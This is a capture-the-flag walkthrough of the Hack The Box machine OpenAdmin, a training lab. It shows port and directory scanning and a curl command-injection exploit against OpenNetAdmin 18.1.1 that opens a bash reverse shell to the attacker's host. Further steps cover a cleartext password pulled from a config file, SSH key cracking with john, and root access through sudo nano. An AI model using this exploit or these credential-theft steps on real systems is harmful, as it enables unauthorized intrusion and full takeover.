# [OpenAdmin](https://app.hackthebox.com/machines/OpenAdmin)

```bash
nmap -sT -p- --min-rate 10000 10.10.10.171 -Pn
```

![Alt text](img/image.png)

Here, we see that (22,80) ports are open.Let's do greater nmap scan for this ports.

```bash
nmap -sC -sV -A -p22,80 10.10.10.171 -Pn
```

![Alt text](img/image-1.png)


Directory Enumeration.

```bash
gobuster dir -u http://10.10.10.171 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php,txt,html 
```


![Alt text](img/image-2.png)

While enumerating '/music' directory , I see that there is endpoint '/ona' , we can access here.

![Alt text](img/image-3.png)


Let's search exploit for 'OpenNetAdmin' version of 18.1.1 that we can find anything.

![Alt text](img/image-4.png)


Let's do manually use this exploit.

```bash
curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.16.8/1337 0>%261'&xajaxargs[]=ping"  http://10.10.10.171/ona/
```

![Alt text](img/image-5.png)

We got reverse shell from port (1337).

![Alt text](img/image-6.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-7.png)


I find cleartext credentials for file (database_settings.inc.php) on '/var/www/html/ona/local/config' directory.

![Alt text](img/image-8.png)


I tried this credentials, and worked for 'jimmy' user.

jimmy: n1nj4W4rri0R!

![Alt text](img/image-9.png)



While I doing local enumeration for network.

```bash
netstat -ntpl
```

![Alt text](img/image-10.png)


There is port (52846) , if we browse this page, it gives private key (id_rsa).

![Alt text](img/image-11.png)


I need to crack this by using `ssh2john` tool.

```bash
ssh2john id_rsa > hash.txt
```

After we got hash, we need to crack this via `john` tool.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![Alt text](img/image-12.png)


Let's login via this private key (id_rsa) file.

```bash
chmod 600 id_rsa
ssh -i id_rsa joanna@10.10.10.171
```

![Alt text](img/image-13.png)

user.txt

![Alt text](img/image-14.png)


While I try to do privilege escalation via checking `sudo -l` command.

![Alt text](img/image-15.png)


I find exploit for privesc from [here](https://gtfobins.github.io/gtfobins/nano/#sudo)

```bash
sudo /bin/nano /opt/priv

^R^X  #means Ctrl+R then Ctrl+X
reset; sh 1>&0 2>&0
```


root.txt

![Alt text](img/image-16.png)